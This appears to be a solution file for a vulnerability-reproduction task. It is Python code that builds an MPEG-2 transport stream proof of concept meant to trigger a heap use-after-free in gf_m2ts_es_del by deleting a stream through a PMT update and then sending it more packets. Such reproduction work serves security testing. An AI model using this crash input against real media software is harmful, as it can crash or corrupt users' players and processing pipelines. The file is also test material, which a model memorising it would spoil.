import struct
import binascii

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in gf_m2ts_es_del.
        
        The vulnerability likely involves a race condition or logic error where an Elementary Stream (ES)
        is deleted via a PMT update, but subsequent packets referencing that ES ID access the freed memory.
        
        Structure of PoC (6 packets, 1128 bytes):
        1. PAT: Defines Program 1 at PID 0x100.
        2. PMT (v0): Defines Program 1 with ES at PID 0x200.
        3. PES: Data for ES 0x200 (allocates/initializes stream).
        4. PES: More data for ES 0x200.
        5. PMT (v1): Updates Program 1, removing ES 0x200 (triggers gf_m2ts_es_del).
        6. PES: Data for ES 0x200 (accesses freed stream).
        """
        
        def mpeg_crc32(data):
            """Calculate MPEG-2 CRC32."""
            crc = 0xFFFFFFFF
            for byte in data:
                crc ^= (byte << 24)
                for _ in range(8):
                    if crc & 0x80000000:
                        crc = (crc << 1) ^ 0x04C11DB7
                    else:
                        crc = crc << 1
                    crc &= 0xFFFFFFFF
            return crc

        def make_packet(pid, payload, cc, pusi=False):
            """Construct a 188-byte M2TS packet."""
            # Header: Sync(1) Flags(2) PID/Flags(1)
            # Sync 0x47
            header_int = 0x47 << 24
            
            # TEI(0), PUSI(pusi), Prio(0), PID(13)
            flags_pid = pid & 0x1FFF
            if pusi:
                flags_pid |= 0x4000
            header_int |= (flags_pid << 8)
            
            # Transport Scrambling(0), Adapt(0), CC(4)
            # AFC = 1 (Payload only), CC = cc
            afc_cc = 0x10 | (cc & 0x0F)
            header_int |= afc_cc
            
            header = struct.pack('>I', header_int)
            
            # Payload stuffing
            remaining = 188 - 4
            if len(payload) < remaining:
                # Pad with 0xFF
                data = payload + b'\xff' * (remaining - len(payload))
            else:
                data = payload[:remaining]
            
            return header + data

        packets = []

        # 1. PAT Packet
        # PID 0, CC 0
        # Program 1 -> PID 0x100
        pat_payload = b'\x00' # Pointer field
        # Section Header: TableID 00, Syntax 1, Len 13 (0x0D) -> 00 B0 0D
        # Data: TSID 1 (00 01), Ver 0 CN 1 (C1), Sec 0 (00), Last 0 (00)
        # Loop: Prog 1 (00 01), PID 0x100 (E1 00)
        section = b'\x00\xb0\x0d\x00\x01\xc1\x00\x00\x00\x01\xe1\x00'
        section += struct.pack('>I', mpeg_crc32(section))
        packets.append(make_packet(0, pat_payload + section, 0, pusi=True))

        # 2. PMT Packet (Version 0) - Add ES 0x200
        # PID 0x100, CC 0
        # Section Header: TableID 02, Syntax 1, Len 18 (0x12) -> 02 B0 12
        # Data: Prog 1 (00 01), Ver 0 CN 1 (C1), Sec 0 (00), Last 0 (00)
        #       PCR PID 0x1FFF (FF FF), InfoLen 0 (F0 00)
        # Loop: Type 0x1B (AVC) (1B), PID 0x200 (E2 00), InfoLen 0 (F0 00)
        section = b'\x02\xb0\x12\x00\x01\xc1\x00\x00\xff\xff\xf0\x00\x1b\xe2\x00\xf0\x00'
        section += struct.pack('>I', mpeg_crc32(section))
        packets.append(make_packet(0x100, b'\x00' + section, 0, pusi=True))

        # 3. PES Data (PID 0x200) - Stream Content
        # CC 0
        # PES Header: Prefix 00 00 01, StreamID E0 (Video), Len 00 00
        pes_payload = b'\x00\x00\x01\xe0\x00\x00' + b'\xAA' * 100
        packets.append(make_packet(0x200, pes_payload, 0, pusi=True))

        # 4. PES Data (PID 0x200) - Continuation
        # CC 1
        packets.append(make_packet(0x200, b'\xBB'*184, 1, pusi=False))

        # 5. PMT Packet (Version 1) - Remove ES 0x200
        # PID 0x100, CC 1
        # Section Header: TableID 02, Len 13 (0x0D) -> 02 B0 0D
        # Data: Prog 1 (00 01), Ver 1 CN 1 (C3), Sec 0 (00), Last 0 (00)
        #       PCR PID 0x1FFF (FF FF), InfoLen 0 (F0 00)
        # Loop: Empty (Stream 0x200 removed)
        section = b'\x02\xb0\x0d\x00\x01\xc3\x00\x00\xff\xff\xf0\x00'
        section += struct.pack('>I', mpeg_crc32(section))
        packets.append(make_packet(0x100, b'\x00' + section, 1, pusi=True))

        # 6. PES Data (PID 0x200) - Trigger UAF
        # CC 2
        # This packet arrives for PID 0x200 which was just removed from the PMT.
        # If internal structures for 0x200 were freed but referenced in the demuxer loop, this crashes.
        packets.append(make_packet(0x200, b'\xCC'*184, 2, pusi=False))

        return b''.join(packets)
